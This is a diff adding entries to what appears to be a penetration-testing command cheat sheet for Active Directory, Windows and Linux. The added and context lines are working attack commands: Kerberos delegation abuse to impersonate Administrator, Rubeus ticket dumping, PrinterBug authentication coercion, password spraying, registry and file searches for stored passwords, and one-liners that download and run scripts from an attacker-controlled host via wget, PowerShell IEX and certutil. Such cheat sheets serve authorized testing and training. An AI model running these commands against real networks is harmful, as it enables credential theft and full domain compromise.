@@ -143,10 +143,19 @@ ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=user)" sAMAccountNa
 # Enumerate groups with description
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=group)" cn description
 
+# Enumerate AD organizational units
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=organizationalUnit)" ou
+
+# Enumerate domain policies
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=groupPolicyContainer)" gPCFileSysPath
+
 
 ######################################################################
 # WINRM & RDP ACCESS
 ######################################################################
+# Check if WinRM port is reachable before attempting login
+curl -I http://$targetip:5985
+curl -I http://$targetip:5986
 
 # NetExec WINRM auth check - verify WinRM access
 netexec winrm $targetip -u $user -p "$password"
@@ -165,7 +174,6 @@ xfreerdp /v:$targetip /u:$user /p:"$password" /dynamic-resolution +clipboard
 
 # RDP connection with specific domain
 xfreerdp /v:$targetip /u:$domain\\$user /p:"$password" /dynamic-resolution +clipboard
-
 
 ######################################################################
 # MSSQL ENUMERATION & EXPLOITATION
@@ -232,6 +240,16 @@ impacket-getTGT $domain/$user:$password
 # Simple SMB authentication test
 impacket-smbclient $domain/$user:$password@$targetip
 
+# Request a Kerberos TGT (great for testing creds)
+impacket-getTGT $domain/$user:$password
+
+# Test SMB authentication directly
+impacket-smbclient $domain/$user:$password@$targetip
+
+# Constrained Delegation - Obtain service ticket as another user
+impacket-getST -spn <service>/<hostname> -impersonate Administrator \
+$domain/$user:$password -dc-ip $targetip
+
 ######################################################################
 # NETEXEC / CRACKMAPEXEC - HASH DUMPING WORKFLOW
 ######################################################################
@@ -278,6 +296,37 @@ crackmapexec smb $targetip -u users.txt -p passwords.txt --no-bruteforce
 # Kerberos password spray (avoids SMB/WinRM detection)
 kerbrute passwordspray -d $domain --dc $targetip users.txt 'Password1!'
 
+###############################
+# RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)
+###############################
+
+# Create a computer account (needed for RBCD attacks)
+addcomputer.py -dc-ip $targetip $domain/$user:$password \
+-computer-name 'WINDEV01$' -computer-pass 'Pass123!'
+
+# Assign RBCD rights from attacker computer → target host
+impacket-rbcd -delegate-from 'WINDEV01$' \
+-delegate-to 'TARGETSERVER$' -dc-ip $targetip \
+-action write -user $user -password $password
+
+# After RBCD is assigned, impersonate Administrator
+getST.py -spn cifs/TARGETSERVER.$domain \
+-impersonate Administrator \
+"$domain/WINDEV01$":"Pass123!"
+
+###############################
+# UNCONSTRAINED DELEGATION (TGT Harvesting)
+###############################
+
+# Dump Kerberos tickets on compromised Windows machine
+Rubeus dump /nowrap
+
+###############################
+# PRINTERBUG (Trigger authentication from the DC)
+###############################
+
+# Coerce the DC to authenticate to your controlled machine
+printerbug.py $domain/$user:$password@$targetip $localip
 
 ######################################################################
 # GETTING SHELLS USING HASHES
@@ -352,6 +401,14 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ######################################################################
 # LINUX PRIVILEGE ESCALATION - QUICK ENUM
 ######################################################################
+# Check for PATH vulnerabilities
+echo $PATH
+ls -ld $(echo $PATH | tr ':' ' ')
+
+# GTFOBins-style SUID scan (extended)
+for bin in $(find / -perm -4000 -type f 2>/dev/null); do
+    echo "[SUID] $bin"
+done
 
 # Check current user and groups
 id
@@ -394,6 +451,13 @@ wget http://$localip/linpeas.sh -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /t
 # WINDOWS PRIVILEGE ESCALATION - QUICK ENUM
 ######################################################################
 
+# Search for passwords inside files on Windows
+findstr /S /I "password" C:\*.txt
+findstr /S /I "password" C:\*.xml
+findstr /S /I "password" C:\*.ini
+findstr /S /I "password" C:\*.config
+
+
 # Who am I and privs
 whoami
 whoami /all
@@ -423,6 +487,19 @@ sc query state= all
 # Download and run winPEAS (example PowerShell)
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$localip/winPEAS.ps1')"
 
+# Enumerate logged-in users (often reveals admins)
+qwinsta
+
+# Search registry for password strings
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+# Check for AlwaysInstallElevated misconfiguration (priv-escalation)
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+
+# List installed applications (useful for known-vuln software)
+wmic product get name,version
 
 ######################################################################
 # ACTIVE DIRECTORY ENUMERATION - BLOODHOUND
@@ -558,6 +635,7 @@ certutil -urlcache -split -f http://$localip/file.exe file.exe
 ######################################################################
 
 ######################################################################
+
 
 
 
